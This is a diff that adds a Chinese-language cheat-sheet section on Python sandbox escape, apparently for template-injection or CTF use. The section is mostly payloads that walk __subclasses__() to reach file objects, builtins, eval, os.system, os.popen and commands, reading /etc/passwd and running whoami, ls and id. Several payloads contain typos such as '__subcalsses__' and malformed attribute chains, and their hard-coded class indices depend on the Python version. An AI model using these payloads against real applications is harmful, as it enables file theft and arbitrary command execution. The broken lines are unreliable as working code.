@@ -627,9 +627,99 @@ find_eval(url)
 
 
 
+### ④常见可利用类
+
+#### Ⅰ.文件读取
+
+**方法一：子模块利用**
+
+(1)存在的子模块可以通过.index()来查询，如果存在的话返回索引
+
+```python
+''.__class__.__mro__[2].__subclasses__().index(file)
+```
+
+(2)file类:(在字符串的所属对象中获得str的父类，在其object父类中查找所有子类，第41个为file类）
+
+```python
+''.__class__.__mro__[2].__subclasses__()[40]('<File_To_Read>').read()
+```
+
+(3)\_\_frozen\_importlib\_external.FileLoader类：（前置查询一样，其是第91个类）
+
+```python
+''.__class__.__mro__[2].__subclasses__()[91].get_data(0,"<File_To_Read>")
+```
 
 
 
+**方法二：通过函数解析->基本类->基本类子类->重载类->引用->查找可用函数**
+
+```python
+''.__class__.__mro__[2].__subcalsses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read() 
+```
+
+把read改成write就可写了。
+
+
+
+#### Ⅱ.命令执行
+
+**方法一：利用eval进行命令执行**
+
+```python
+''.__class__.__mro__[2]__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')
+```
+
+
+
+**方法二：利用warnings.catch\_warnings进行命令执行**
+
+查看warnings.catch\_warnings方法的位置
+
+```python
+[].__class__.__bases__.__subclasses__().index(warnings.catch_warnings)
+```
+
+查看linecatch的位置
+
+```python
+[].__class__.__bases__.__subclasses__()[59].__init__.__globals__.keys().index('linecache')
+```
+
+查找os模块的位置
+
+```python
+[].__class__.__bases__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')
+```
+
+查找system方法的位置（在这里使用os.open().read()一样可以实现一样的效果，步骤一样，不再复述）
+
+```python
+[].__class__.__bases__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')
+```
+
+调用systen方法
+
+```python
+[].__class__.__bases__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')
+```
+
+
+
+**方法三：利用commands进行命令执行**
+
+```python
+{}.__class__.__bases__[0].__subclasses__()[59].__init__.globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')
+```
+
+```python
+{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('ls')
+```
+
+```python
+{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
+```
 
 
 
